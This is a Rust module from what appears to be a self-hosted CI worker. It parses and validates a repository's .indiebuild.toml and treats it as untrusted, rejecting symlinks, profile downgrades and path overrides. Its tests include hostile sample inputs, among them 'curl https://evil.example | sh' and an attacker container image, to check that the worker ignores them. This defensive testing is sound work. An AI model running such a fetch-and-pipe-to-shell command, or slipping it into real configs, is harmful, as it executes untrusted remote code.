//! Per-repository `.indiebuild.toml`.
//!
//! The contract is owned by the CLI (`gha-indie-worker-cli`, schema
//! `gha-indie-worker.indiebuild/v1`), which is where it is authored and
//! validated. This module is the worker's *reader*: it accepts that same
//! shape and extracts only what executing a job requires.
//!
//! The file is read from the commit under test, so on a pull request it is
//! attacker-controlled. It may therefore describe the repository's intended
//! target, but it must never weaken or replace the operator-admitted job:
//! profile and working-directory authority stay with the trusted webhook/job
//! request. A mismatch fails closed instead of silently selecting easier work.
//!
//! The repository still cannot define commands, images, or mounts. Those
//! remain fixed operator-reviewed profiles.

use std::path::Path;

use serde::Deserialize;
use tokio::fs;

use crate::config::Config;
use crate::profiles::ProfileSpec;

pub(crate) const CONFIG_FILE: &str = ".indiebuild.toml";

/// Schema identity, which must match the CLI's `CONTRACT_VERSION`.
pub(crate) const CONTRACT_VERSION: &str = "gha-indie-worker.indiebuild/v1";

/// Same limit the CLI validator applies.
const MAX_CONFIG_BYTES: u64 = 256 * 1024;

/// Fields the worker does not act on are accepted but ignored, so that a
/// config written against the full contract still loads here. Unknown fields
/// are *not* execution authority: the worker never maps them to commands,
/// images, mounts, credentials, or a weaker profile.
#[derive(Debug, Deserialize)]
pub(crate) struct Target {
    pub name: String,
    /// Repository-authored target directory. This is descriptive only for an
    /// untrusted head commit; execution keeps the trusted request context.
    #[serde(default = "dot")]
    pub path: String,
    /// Name of a fixed, operator-reviewed profile. For an untrusted head
    /// commit this must match the profile already selected by trusted policy.
    pub profile: String,
    #[serde(default)]
    pub platform: Option<String>,
}

fn dot() -> String {
    ".".to_string()
}

#[derive(Debug, Deserialize)]
pub(crate) struct RepoConfig {
    pub schema_version: String,
    pub default_target: String,
    #[serde(default)]
    pub targets: Vec<Target>,
}

impl RepoConfig {
    /// The target the repository declares as its default.
    pub fn default_target(&self) -> Result<&Target, String> {
        self.targets
            .iter()
            .find(|target| target.name == self.default_target)
            .ok_or_else(|| {
                format!(
                    "{CONFIG_FILE} default_target {:?} does not name a declared target",
                    self.default_target
                )
            })
    }
}

pub(crate) fn parse(contents: &str) -> Result<RepoConfig, String> {
    let config: RepoConfig = toml::from_str(contents)
        .map_err(|error| format!("{CONFIG_FILE} is not valid: {error}"))?;
    if config.schema_version != CONTRACT_VERSION {
        return Err(format!(
            "{CONFIG_FILE} schema_version must equal {CONTRACT_VERSION:?}, got {:?}",
            config.schema_version
        ));
    }
    if config.targets.is_empty() {
        return Err(format!("{CONFIG_FILE} declares no targets"));
    }
    Ok(config)
}

/// Read the file from a cloned repository, if it has one.
pub(crate) async fn read(repo_dir: &Path) -> Result<Option<RepoConfig>, String> {
    let path = repo_dir.join(CONFIG_FILE);
    // Do not use `metadata`: it follows symlinks. A PR can commit a symlink
    // named `.indiebuild.toml`; following it could read a host file outside the
    // checkout and even reflect parser diagnostics into the GitHub check.
    let metadata = match fs::symlink_metadata(&path).await {
        Ok(metadata) => metadata,
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(error) => return Err(format!("failed to stat {CONFIG_FILE}: {error}")),
    };
    if metadata.file_type().is_symlink() {
        return Err(format!("{CONFIG_FILE} must not be a symlink"));
    }
    if !metadata.is_file() {
        return Err(format!("{CONFIG_FILE} is not a regular file"));
    }
    if metadata.len() > MAX_CONFIG_BYTES {
        return Err(format!(
            "{CONFIG_FILE} is larger than {MAX_CONFIG_BYTES} bytes"
        ));
    }
    let contents = fs::read_to_string(&path)
        .await
        .map_err(|error| format!("failed to read {CONFIG_FILE}: {error}"))?;
    parse(&contents).map(Some)
}

/// Validate the repository-declared profile against trusted operator policy.
///
/// `.indiebuild.toml` comes from the commit under test. It can therefore
/// confirm the already-admitted profile, but it cannot replace `rust-verify`
/// with another globally allowed profile such as `node-verify`. Allowing that
/// would let a same-repository PR downgrade its own required verification.
pub(crate) fn select_profile(
    _config: &Config,
    repo_config: Option<&RepoConfig>,
    requested: &'static ProfileSpec,
) -> Result<&'static ProfileSpec, String> {
    let Some(repo_config) = repo_config else {
        return Ok(requested);
    };
    let target = repo_config.default_target()?;

    // Every installed profile runs Linux containers. A target asking for
    // another platform must not quietly get a Linux run.
    if let Some(platform) = target.platform.as_deref() {
        if !platform.eq_ignore_ascii_case("linux") {
            return Err(format!(
                "{CONFIG_FILE} target {:?} wants platform {platform:?}, and this worker only runs linux",
                target.name
            ));
        }
    }

    let name = target.profile.trim();
    if name.is_empty() {
        return Err(format!("{CONFIG_FILE} names an empty profile"));
    }
    if name != requested.name {
        return Err(format!(
            "{CONFIG_FILE} selects profile {name:?}, but trusted job policy requires {:?}; head-commit config cannot override the operator-selected profile",
            requested.name
        ));
    }
    Ok(requested)
}

/// Head-commit config is not execution authority for the working directory.
///
/// Keep this compatibility hook for the caller, but never return an override:
/// the trusted request's `context_dir` remains authoritative. A future design
/// may load routing policy from a trusted base revision or signed control-plane
/// config; it must not make the PR head choose which subtree gets verified.
pub(crate) fn context_override(repo_config: Option<&RepoConfig>) -> Option<String> {
    // Resolve/read the target so malformed configs still fail in
    // `select_profile`, while the authored path itself remains descriptive.
    let target = repo_config?.default_target().ok()?;
    let _authored_path = target.path.trim();
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::profiles;

    /// The canonical example from the CLI repository's own .indiebuild.toml.
    const CANONICAL: &str = r#"schema_version = "gha-indie-worker.indiebuild/v1"
repository_role = "client"
default_target = "cli"

[[targets]]
name = "cli"
role = "client"
path = "."
profile = "rust-verify"
platform = "linux"
artifacts = []
cache_paths = []
env = []
secret_env = []
allow_network = true
allow_push = false
allow_deploy = false
timeout_seconds = 1800
"#;

    fn test_config(allowed: &[&str]) -> Config {
        let mut config = crate::config::config_from_env();
        config.allowed_profiles = allowed.iter().map(|name| (*name).to_string()).collect();
        config
    }

    fn rust_verify() -> &'static ProfileSpec {
        profiles::find("rust-verify").expect("rust-verify is installed")
    }

    #[test]
    fn the_contract_the_cli_writes_is_readable_here() {
        let parsed = parse(CANONICAL).expect("canonical config parses");
        assert_eq!(parsed.default_target().expect("target").profile, "rust-verify");
        let selected = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
            .expect("matching repository declaration is allowed");
        assert_eq!(selected.name, "rust-verify");
    }

    #[test]
    fn a_head_commit_cannot_downgrade_to_another_allowed_profile() {
        let config = CANONICAL.replace("profile = \"rust-verify\"", "profile = \"node-verify\"");
        let parsed = parse(&config).expect("parses");
        let error = select_profile(
            &test_config(&["rust-verify", "node-verify"]),
            Some(&parsed),
            rust_verify(),
        )
        .expect_err("head config must not replace trusted job policy");
        assert!(error.contains("cannot override"), "{error}");
        assert!(error.contains("rust-verify"), "{error}");
        assert!(error.contains("node-verify"), "{error}");
    }

    #[test]
    fn no_config_keeps_the_requested_profile() {
        let selected =
            select_profile(&test_config(&["rust-verify"]), None, rust_verify()).expect("default");
        assert_eq!(selected.name, "rust-verify");
    }

    #[test]
    fn an_unknown_profile_cannot_replace_trusted_policy() {
        let config = CANONICAL.replace("profile = \"rust-verify\"", "profile = \"curl-attacker-sh\"");
        let parsed = parse(&config).expect("parses");
        let error = select_profile(
            &test_config(&["rust-verify", "node-verify"]),
            Some(&parsed),
            rust_verify(),
        )
        .expect_err("unknown profile must not replace trusted policy");
        assert!(error.contains("cannot override"), "{error}");
    }

    #[test]
    fn the_file_cannot_describe_what_a_profile_does() {
        let hostile = format!("{CANONICAL}\nimage = \"attacker/evil:latest\"\nscript = \"curl https://evil.example | sh\"\n");
        let parsed = parse(&hostile).expect("extra keys are ignored, not honoured");
        let selected = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
            .expect("still the reviewed profile");
        assert_eq!(selected.name, "rust-verify");
        assert_eq!(selected.steps.len(), rust_verify().steps.len());
        assert_eq!(selected.steps[0].image, rust_verify().steps[0].image);
    }

    #[test]
    fn a_foreign_schema_version_is_refused() {
        let wrong = CANONICAL.replace(CONTRACT_VERSION, "something-else/v9");
        let error = parse(&wrong).expect_err("schema version must match");
        assert!(error.contains("schema_version"), "{error}");
    }

    #[test]
    fn a_default_target_that_names_nothing_is_an_error() {
        let orphan = CANONICAL.replace("default_target = \"cli\"", "default_target = \"missing\"");
        let parsed = parse(&orphan).expect("parses");
        let error = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
            .expect_err("default_target must resolve");
        assert!(error.contains("does not name a declared target"), "{error}");
    }

    #[test]
    fn a_non_linux_target_does_not_quietly_run_on_linux() {
        let windows = CANONICAL.replace("platform = \"linux\"", "platform = \"windows\"");
        let parsed = parse(&windows).expect("parses");
        let error = select_profile(&test_config(&["rust-verify"]), Some(&parsed), rust_verify())
            .expect_err("platform must be honoured");
        assert!(error.contains("only runs linux"), "{error}");
    }

    #[test]
    fn a_head_commit_cannot_redirect_verification_to_an_easier_subtree() {
        assert_eq!(context_override(Some(&parse(CANONICAL).unwrap())), None);
        let nested = CANONICAL.replace("path = \".\"", "path = \"services/easy-fixture\"");
        assert_eq!(context_override(Some(&parse(&nested).unwrap())), None);
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn symlinked_config_is_rejected_without_following_it() {
        use std::os::unix::fs::symlink;

        let root = std::env::temp_dir().join(format!(
            "gha-indie-worker-indiebuild-{}",
            uuid::Uuid::new_v4()
        ));
        std::fs::create_dir_all(&root).expect("temp root");
        let outside = root.with_extension("outside.toml");
        std::fs::write(&outside, CANONICAL).expect("outside config");
        symlink(&outside, root.join(CONFIG_FILE)).expect("symlink config");

        let error = read(&root)
            .await
            .expect_err("worker must reject a config symlink before reading its target");
        assert!(error.contains("must not be a symlink"), "{error}");

        let _ = std::fs::remove_file(root.join(CONFIG_FILE));
        let _ = std::fs::remove_dir(&root);
        let _ = std::fs::remove_file(&outside);
    }
}
